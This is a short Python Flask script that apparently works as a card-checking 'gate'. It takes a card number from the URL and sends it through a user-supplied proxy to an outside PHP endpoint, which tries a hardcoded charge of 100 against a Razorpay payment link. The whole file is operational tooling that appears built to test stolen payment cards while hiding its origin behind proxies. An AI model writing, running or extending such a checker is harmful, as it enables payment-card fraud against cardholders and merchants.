from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

TARGET = "https://mydom.arpitchk.shop/autorz.php/"

@app.route('/gate=rz/cc=<card>', methods=['GET'])
def gate(card):
    proxy = request.args.get('proxy')
    
    if not proxy:
        return jsonify({"status": "error", "message": "proxy parameter missing"}), 400

    # HARDCODED amount=100
    url = f"{TARGET}?cc={card}&url=https://razorpay.me/@ukinternational&proxy={proxy}&amount=100"

    try:
        # Fix proxy format - remove 'http://' if present
        if proxy.startswith('http://'):
            proxy = proxy[7:]
        elif proxy.startswith('https://'):
            proxy = proxy[8:]

        proxies = {
            "http":  f"http://{proxy}",
            "https": f"http://{proxy}"
        }

        print(f"Requesting: {url}")  # Debug
        print(f"Proxy: {proxy}")     # Debug

        r = requests.get(url, proxies=proxies, timeout=30)
        data = r.json()

        return jsonify({
            "status": data.get("status", "unknown"),
            "message": data.get("message", "No message from gate")
        })

    except Exception as e:
        return jsonify({
            "status": "gateway_error", 
            "message": f"Error: {str(e)[:100]}"
        }), 502

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
